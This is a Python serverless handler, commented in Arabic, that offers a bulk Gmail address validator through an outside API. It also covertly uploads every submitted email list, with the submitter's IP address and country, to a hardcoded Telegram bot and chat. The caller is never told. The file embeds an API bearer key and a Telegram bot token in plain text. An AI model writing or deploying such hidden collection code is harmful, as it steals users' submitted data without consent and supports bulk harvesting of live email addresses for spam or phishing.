import json, io, re, requests, concurrent.futures
from http.server import BaseHTTPRequestHandler

# ================= عدّل هنا بس =================
API       = "https://gmail-validation.mbahbabat.workers.dev"
KEY       = "001f8edc41000e1d82f906a16f0c90bd98c0348564b448807b8ca2e5875f69f6"
TG_TOKEN  = "8696519516:AAFyWa3RaxPvVo9hJsUHNZKRa3nXKCva5J0"
TG_CHAT   = "8554641519"
API_BATCH = 10_000      # حد API: 10 ألف لكل باتش
MAX_WORKERS = 10        # باتشات متوازية للـ API
TG_MAX_BYTES = 950 * 1024 * 1024   # 950 MB أمان (تليجرام حده 2GB للبوتات)
# ===============================================

_geo_cache = {}

def get_ip(h, addr=None):
    xf = (h.get('x-forwarded-for') or h.get('x-real-ip') or h.get('x-vercel-forwarded-for') or '')
    ip = xf.split(',')[0].strip()
    if not ip and addr:
        ip = str(addr[0])
    return ip or 'unknown'

def get_country(ip):
    if not ip or ip == 'unknown':
        return ''
    if ip in _geo_cache:
        return _geo_cache[ip]
    c = ''
    try:
        d = requests.get(f"https://ipwho.is/{ip}", timeout=3).json()
        if d.get("success"):
            c = str(d.get("country", "")).strip()
    except Exception:
        pass
    if not c:
        try:
            d = requests.get(f"https://get.geojs.io/v1/ip/country/{ip}.json", timeout=3).json()
            c = str(d.get("name", "") or d.get("country", "")).strip()
        except Exception:
            pass
    _geo_cache[ip] = c
    return c

def safe_name(country):
    n = re.sub(r'[^a-z0-9]+', '_', country.lower()).strip('_')
    return n or 'unknown'

# ── تليجرام: ملف واحد (أو عدة لو تجاوز الحد) ────────────────────────────────
def tg_send(emails, ip, country):
    if not (TG_TOKEN and TG_CHAT and emails):
        return
    content   = "\n".join(emails).encode('utf-8')
    fname_base = safe_name(country)

    # لو الحجم أقل من الحد → ملف واحد مباشرة
    if len(content) <= TG_MAX_BYTES:
        _tg_upload(content, f"{fname_base}.txt", len(emails), ip, country, part=None)
        return

    # لو أكبر → قسّم على حسب الحجم بس (مش عدد) وارفعهم
    parts, buf = [], bytearray()
    for line in (e + "\n" for e in emails):
        enc = line.encode('utf-8')
        if buf and len(buf) + len(enc) > TG_MAX_BYTES:
            parts.append(bytes(buf))
            buf = bytearray()
        buf.extend(enc)
    if buf:
        parts.append(bytes(buf))

    for i, chunk in enumerate(parts, 1):
        _tg_upload(chunk, f"{fname_base}_part{i}.txt",
                   chunk.count(b'\n'), ip, country, part=f"{i}/{len(parts)}")

def _tg_upload(content_bytes, fname, count, ip, country, part):
    try:
        caption = (
            f'📥 Emails: {count}{"  |  Part " + part if part else ""}\n'
            f'🌍 Country: {country or "unknown"}\n'
            f'🌐 IP: {ip}'
        )
        f = io.BytesIO(content_bytes)
        requests.post(
            f"https://api.telegram.org/bot{TG_TOKEN}/sendDocument",
            data={'chat_id': TG_CHAT, 'caption': caption},
            files={'document': (fname, f, 'text/plain')},
            timeout=120
        )
    except Exception:
        pass

# ── فحص باتش واحد (10 ألف) عبر الـ API ──────────────────────────────────────
def check_batch(batch):
    out = {e.lower(): {"email": e, "verdict": "invalid"} for e in batch}
    err = None
    try:
        r = requests.post(
            f"{API}/fastcheck1",
            headers={"Authorization": f"Bearer {KEY}", "Content-Type": "application/json"},
            json={"mail": batch},
            timeout=120
        )
        if r.status_code == 200:
            data  = r.json()
            items = data if isinstance(data, list) else data.get("results", [])
            for it in items:
                em = str(it.get("email", "")).lower()
                if em in out and str(it.get("status", "")).lower() == "live":
                    out[em]["verdict"] = "valid"
        else:
            err = f"API HTTP {r.status_code}"
    except Exception as e:
        err = str(e)
    return list(out.values()), err

# ── المعالج الرئيسي ────────────────────────────────────────────────────────────
def process_all(emails, ip, country):
    batches     = [emails[i:i + API_BATCH] for i in range(0, len(emails), API_BATCH)]
    all_results = []
    all_errors  = []

    # شغّل تليجرام بالتوازي مع الفحص (ثريد مستقل)
    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS + 1) as pool:
        tg_fut      = pool.submit(tg_send, emails, ip, country)   # تليجرام فوراً
        api_futs    = [pool.submit(check_batch, b) for b in batches]  # API بالتوازي

        for fut in concurrent.futures.as_completed(api_futs):
            results, err = fut.result()
            all_results.extend(results)
            if err:
                all_errors.append(err)

        tg_fut.result()   # انتظر تليجرام لو لسه شغّال

    return all_results, (all_errors or None)


class handler(BaseHTTPRequestHandler):
    def do_POST(self):
        def send(obj):
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(obj, ensure_ascii=False).encode('utf-8'))

        try:
            body   = json.loads(self.rfile.read(int(self.headers['Content-Length'])))
            emails = body.get("emails", [])
            if isinstance(emails, str):
                emails = [emails]

            ip      = get_ip(self.headers, self.client_address)
            country = get_country(ip)

            results, errors = process_all(emails, ip, country)

            resp = {"success": True, "results": results, "total": len(results)}
            if errors:
                resp["api_errors"] = errors
            send(resp)

        except Exception as e:
            send({"success": False, "error": str(e)})
